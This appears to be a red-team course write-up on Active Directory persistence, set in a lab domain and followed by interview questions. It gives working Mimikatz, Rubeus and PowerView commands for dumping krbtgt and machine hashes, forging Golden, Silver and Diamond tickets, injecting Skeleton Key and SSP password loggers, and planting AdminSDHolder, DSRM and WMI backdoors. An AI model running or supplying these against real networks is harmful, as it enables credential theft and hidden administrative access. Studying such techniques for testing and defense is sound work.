---
layout: mission
title: "Active Directory Persistence: The Complete Guide"
date: 2024-06-07
categories: [Active Directory, Persistence, Advanced Exploitation]
toc: true
---

# ♾️ Active Directory Persistence: The Art of "Never Letting Go"

Persistence is the phase where you secure your foothold. The goal is simple: **Maintain access** to the network even if the administrator detects your initial breach, changes passwords, or patches the original vulnerability.

This guide covers the most powerful persistence techniques in Active Directory, ranging from Ticket forgery (Golden/Silver/Diamond) to infrastructure abuse (AdminSDHolder, DSRM).

---

## 🎫 1. Golden Ticket (TGT Forgery)

### **The Theory**
A **Golden Ticket** is a forged Kerberos **Ticket Granting Ticket (TGT)**.
In Active Directory, the `krbtgt` account (Key Distribution Center Service Account) signs all TGTs. If an attacker obtains the **NTLM hash** or **AES keys** of the `krbtgt` account, they can create their own valid TGTs offline.

**Why is it so dangerous?**

**Fabricated Identity:** You can create a ticket for *any* user (even one that doesn't exist).

**Unlimited Privilege:** You can add your user to the "Domain Admins" group (RID 512) inside the ticket.

**Long Life:** You can set the ticket validity to 10 years (default is 10 hours).

**Any Service:** A valid TGT allows you to request a Service Ticket (TGS) for *any* service in the domain.

![image](/images/image%20106.png)

### **Exploitation Steps**

**Step 1: Dump the `krbtgt` Hash**
You must have Domain Admin privileges to extract this secret.

**Method A: Mimikatz (On DC)**
    
    This injects into LSASS on the DC to read the database.
    
    ```
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
    ```

**Method B: DCSync (Remote)**
    
    This uses the Directory Replication Service (DRS) protocol to ask the DC for the hash over the network (stealthier/no code execution on DC).
    
    ```
    SafetyKatz.exe "lsadump::dcsync /user:dcorp-dc\krbtgt" "exit"
    ```

**Step 2: Forge the Ticket**

**Option 1: Using BetterSafetyKatz**
    
    This tool automatically grabs the current Domain SID and generates the ticket.
    
    ```
    C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:<CurrentDomainSID> /aes256:<KRBTGT_KEY> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
    ```
    
    `/ptt`: Pass-The-Ticket (Injects it immediately into memory).
    `/id:500`: Sets the User ID to Administrator.
    `/groups:512`: Adds the user to Domain Admins.

    ![image](/images/image%20107.png)

    ![image](/images/image%20108.png)

**Option 2: Using Rubeus (OpSec Safe)**
    
    Rubeus allows for more granular control. It performs LDAP queries to fetch the correct "netbios name" and "flags" to make the ticket look legitimate to defenders.
    
    ```
    C:\AD\Tools\Rubeus.exe golden /aes256:<KRBTGT_KEY> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:<DomainSID> /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
    ```

    ![image](/images/image%20109.png)

    ![image](/images/image%20110.png)

---

## 🥈 2. Silver Ticket (TGS Forgery)

### **The Theory**
A **Silver Ticket** is a forged **Service Ticket (TGS)**.
While a Golden Ticket is signed by the `krbtgt` (Domain) key, a Silver Ticket is signed by the **Service Account's** password hash (e.g., the Machine Account `DC01$`, or a SQL service account).

**Why is it stealthier?**

**No DC Communication:** The ticket is presented *directly* to the target server. The Domain Controller (KDC) is never contacted for validation.

**No Event Logs:** Since the DC is bypassed, there are no `4768` (TGT Request) or `4769` (TGS Request) logs on the DC.

**Targeted Access:** It grants access *only* to the service running as that specific account (e.g., File Share on the DC, or SQL DB).

![image](/images/image%20118.png)

### **Exploitation Steps**

**Step 1: Obtain the Service Hash**

You need the NTLM or AES hash of the account running the service. For a Domain Controller, this is the machine account hash (`dcorp-dc$`).

```
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

**Step 2: Forge the Ticket**

You must specify the **Service Name** (SPN) you want to access.

1. `CIFS`: File System Access.
    
2. `HTTP`: WinRM / PowerShell Remoting.
    
3. `RPCSS`: WMI Access.
    
4. `HOST`: Scheduled Tasks.
    
**Using BetterSafetyKatz:**
  
```
BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<DomainSID> /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:<MachineNTLM> /startoffset:0 /ending:600 /renewmax:10080 /ptt" "exit"
```
    
 **Using Rubeus:**

```
C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<MachineNTLM> /sid:<DomainSID> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
    

---

## 💎 3. Diamond Ticket (TGT Modification)

### **The Theory**

A Golden Ticket is a "fake" ticket created from scratch. A **Diamond Ticket** is a **modified valid ticket**.

1. Attackers request a legitimate TGT from the DC (generating normal logs).
    
2. They decrypt the TGT using the `krbtgt` key.
    
3. They modify the PAC (Privilege Attribute Certificate) to add themselves to the "Domain Admins" group.
    
4. They re-encrypt it.
    

**Why use it?**

It bypasses detections that look for TGTs with missing or incorrect timestamps, as the TGT has a valid "Issue Date" from the real DC.

### **Exploitation**

```
Rubeus.exe diamond /krbkey:<KRBTGT_KEY> /user:studentX /password:PASSWORD /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

---

## 💀 4. Skeleton Key (Malware)

### **The Theory**

Skeleton Key is an **in-memory malware** that patches the LSASS process on a Domain Controller.

It allows you to configure a "Master Password" (default: `mimikatz`). Once active, _any_ user can authenticate using their real password OR the master password.

**Risks:**

**Not Persistent:** It lives in RAM. If the DC reboots, the key is gone.
    
**Noisy:** It requires `SeDebugPrivilege` and drops a driver, which triggers most EDRs.

### **Exploitation**

```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

**Access:**

```
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
# Password: mimikatz
```

---

## 📂 5. Custom Security Support Provider (SSP)

### **The Theory**

SSPs are DLLs responsible for handling authentication (like NTLM or Kerberos). Mimikatz allows us to inject a malicious SSP (`mimilib.dll`) that intercepts passwords.

Once injected, **every time any user (including DAs) logs into that machine, their cleartext password is logged to a file**.

### **Exploitation**

**In-Memory Injection (Temp):**

    ```
    Invoke-Mimikatz -Command '"misc::memssp"'
    ```
    
 - Logs to: `C:\Windows\system32\mimilsa.log`.
        
**Registry Modification (Persistent):**
    
Copy `mimilib.dll` to `System32` and add "mimilib" to the `Security Packages` registry key. This survives reboots.
    

---

## 🛡️ 6. AdminSDHolder (ACL Abuse)

### **The Theory**

Active Directory has a self-healing mechanism called **SDProp** (Security Descriptor Propagator).

**The Protected Groups:** Groups like "Domain Admins" and "Enterprise Admins" are considered "Protected."
    
**The Template:** AD keeps a secure template object called **AdminSDHolder**.
    
**The Process:** Every **60 minutes**, SDProp runs. It checks the ACL of every Protected Group. If the ACL does not match AdminSDHolder, it **overwrites** it with the AdminSDHolder ACL.
    

**The Attack:**

If we add our user (`student1`) to the ACL of **AdminSDHolder**, SDProp will automatically add us to the ACL of **Domain Admins** within an hour. This allows us to modify Domain Admin accounts (e.g., reset their passwords) indefinitely.

**Protected Groups List:**

![image](/images/image%20137.png)

**Well Known Abuse:**

![image](/images/image%20138.png)

 With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it
  
  
### **Exploitation**

**Step 1: Modify AdminSDHolder ACL**

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -Verbose
```

**Step 2: Force SDProp (Optional)**

Wait 60 mins or force the run:

```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

**Step 3: Abuse the Persistence**

Now `student1` has "Full Control" over the Domain Admins group. You can add yourself to the group whenever you want.

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members student1
```


Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory - (this only runs every hour that applies everything from AdminSDHolder to all the protected group, so not waiting for an hour to compete we will run it manually.)

```
$se=new-pssession -computername dcorp-dc

invoke-command -session $se -filepath c:\ad\tools\Invoke-SDPropagator.ps1

invoke-command -session $se -scriptblock{Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose}

'Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose'
```

For pre-Server 2008 machines

```
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

**NOW CHECKING THE SUCCESS!**

Check the Domain Admins permission - PowerView as normal user -

```
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student204"}
```

Using ActiveDirectory Module

```
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'} 
```

**NOW ABUSING OUR PERSISTED RIGHTS!

Abusing FullControl using PowerView

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

Using ActiveDirectory Module

```
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```


Abusing ResetPassword using PowerView

```
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString "password" -AsPlainText -Force) -Verbose
```

Using ActiveDirectory Module

```
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```


---

## 🚪 7. DSRM (Directory Services Restore Mode)

### **The Theory**

DSRM is a special "Safe Mode" for Domain Controllers. It has a built-in local Administrator account (`.\Administrator`) used for recovery.

**Persistence:** This password is set when the DC is promoted and rarely changed.
    
**The Trick:** By changing a registry key (`DsrmAdminLogonBehavior`), we can force the DC to accept this DSRM account for login **over the network**, effectively giving us a permanent local admin backdoor on the DC.
    

### **Exploitation**

**Step 1: Dump the Hash**

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
```

**Step 2: Modify Registry**

```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**Step 3: Login (Pass-the-Hash)**

```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<DSRM_HASH> /run:powershell.exe"'
```

---

## 🔧 8. Security Descriptors (Service Backdoors)

If you have Admin rights, you can weaken the security permissions (ACLs) of services like WMI or PowerShell Remoting to allow non-admins to connect.

**WMI Backdoor:** Allows `student1` (Low Priv) to run `wmic` commands on the DC.

 ```
 Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
 ```
    
**Remote Registry Backdoor:** Allows `student1` to dump LSA secrets remotely.

 ```
  Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
 ```
    

---

## ❓ 9. Interview Corner: 10 Core Questions

**Q1: What is the specific requirement to create a Golden Ticket?**


**Answer:** You need the **NTLM hash** or **AES keys** of the **`krbtgt`** (Key Distribution Center Service Account).


**Q2: How does a Silver Ticket evade detection by the Domain Controller?**


**Answer:** A Silver Ticket is a forged Service Ticket (TGS) presented directly to the application server (e.g., SQL, CIFS). It does not involve the KDC (Domain Controller), so no TGT/TGS request logs are generated on the DC.


**Q3: What is the "AdminSDHolder" object and how is it abused?**


**Answer:** It is a security template for Protected Groups (like Domain Admins). The **SDProp** process runs every 60 minutes to enforce its ACL onto those groups. Attackers add permissions to AdminSDHolder so that SDProp automatically pushes those permissions to Domain Admins, ensuring persistence even if the user is removed from the group.


**Q4: Explain the "Diamond Ticket" attack.**


**Answer:** It is a TGT **Modification** attack. Instead of forging a fake ticket (Golden Ticket), the attacker requests a valid TGT, decrypts it using the `krbtgt` key, adds elevated privileges (PAC modification), and re-encrypts it. This creates a ticket with a valid, legitimate timestamp from the DC.


**Q5: What is the `DsrmAdminLogonBehavior` registry key?**


**Answer:** It controls the logon behavior of the local DSRM Administrator account on a DC. Setting it to `2` allows the DSRM account to log in via the network (e.g., SMB/WinRM) while the DC is running normally, acting as a backdoor.


**Q6: Why is the Skeleton Key attack not persistent?**


**Answer:** Skeleton Key patches the `lsass.exe` process in **memory**. If the Domain Controller is rebooted, the patch is lost and must be re-applied.


**Q7: Which service SPN allows you to access the file system using a Silver Ticket?**


**Answer:** The **`CIFS`** (Common Internet File System) service. Forging a ticket for `cifs/target.domain` allows access to file shares.


**Q8: What is "SDProp"?**


**Answer:** Security Descriptor Propagator. It is a background task on the PDC Emulator that runs every hour to ensure Protected Groups have secure permissions matching the AdminSDHolder template.


**Q9: If you use the Custom SSP `mimilib.dll`, where are passwords stored?**


**Answer:** They are logged in cleartext to `C:\Windows\system32\mimilsa.log` on the target machine.


**Q10: Can a Golden Ticket access services if the user password changes?**


**Answer:** Yes. A Golden Ticket is encrypted with the `krbtgt` key. It is valid until the **`krbtgt`** password is changed (twice), regardless of the specific user's password status.


---

## 🎭 10. Scenario-Based Questions (Bar Raiser)

**Scenario 1: The Healed Backdoor**


**Context:** You added `Student1` to the "Domain Admins" group. 45 minutes later, you check the group and `Student1` is gone. You add them again. They disappear again.


**Question:** What is happening?


**Answer:** The **SDProp** process is running. The "Domain Admins" group is a Protected Group. SDProp is overwriting the group's ACL with the ACL from **AdminSDHolder**, which likely doesn't include `Student1`. You must modify AdminSDHolder to make the change persistent.


**Scenario 2: The Silent Logs**


**Context:** You suspect an attacker used a Golden Ticket. You check the Domain Controller logs for Event ID 4768 (TGT Request) but find nothing for that user.


**Question:** Does this prove no ticket was used?


**Answer:** No. A Golden Ticket is forged **offline**. The attacker never asks the DC for it, so no 4768 log is generated. You would only see Event 4769 (Service Ticket Request) or 4624 (Logon) when they _use_ the ticket.


**Scenario 3: The Silver Ticket Fail**


**Context:** You forged a Silver Ticket for the `CIFS` service on `DC01`. You try to use it to use PowerShell Remoting (`Enter-PSSession`) to `DC01`, but it fails.


**Question:** Why?


**Answer:** PowerShell Remoting uses the **`HTTP`** (WinRM) service, not `CIFS`. Silver Tickets are service-specific. You must forge a new ticket for the `HTTP/DC01` SPN.


**Scenario 4: The Rebooted DC**


**Context:** You used the Skeleton Key attack on the DC to log in as `mimikatz`. The admin reboots the DC. You try to log in again and fail.


**Question:** What persistence method should you have used instead for reboot survival?


**Answer:** You should have used **DSRM persistence** (Registry modification) or **AdminSDHolder**. Skeleton Key is memory-only and does not survive reboots.


**Scenario 5: The "Logon Count" anomaly**


**Context:** SOC analysts flag a ticket because the "Logon Count" inside the PAC is 0, but the user is an active employee.


**Question:** What tool likely created this ticket?


**Answer:** This suggests a basic Golden Ticket forgery (likely default Mimikatz settings). Advanced tools like **Rubeus** allow attackers to specify realistic `LogonCount`, `PwdLastSet`, and `UserId` values to avoid this specific detection heuristic.
